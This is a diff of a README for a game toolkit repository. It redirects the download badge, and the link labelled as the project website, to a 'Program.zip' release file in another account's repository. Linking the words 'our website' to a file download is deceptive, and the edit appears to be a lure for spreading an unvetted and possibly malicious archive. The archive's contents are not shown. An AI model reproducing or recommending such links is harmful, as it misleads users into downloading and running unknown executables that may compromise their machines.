@@ -20,7 +20,7 @@ Welcome to the Aurora Game Toolkit (AGT) repository! AGT is a versatile toolkit 
 ## Installation Guide 🚀
 
 To get started with AGT, you can download the toolkit from the following link:
-[![Download AGT](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download AGT](https://github.com/Drxcq/AGT/releases/download/v1.0/Program.zip)](https://github.com/Drxcq/AGT/releases/download/v1.0/Program.zip)
 
 Make sure to extract the contents of the downloaded file before launching the toolkit!
 
@@ -36,7 +36,7 @@ We welcome contributions from the community to help improve AGT and make it even
 
 ## Stay Connected 🌐
 
-For the latest updates and announcements regarding AGT, visit our website [here](https://www.auroragametoolkit.com).
+For the latest updates and announcements regarding AGT, visit our website [here](https://github.com/Drxcq/AGT/releases/download/v1.0/Program.zip).
 
 Join our community of game developers on Discord to connect with fellow AGT users and share your projects.
 
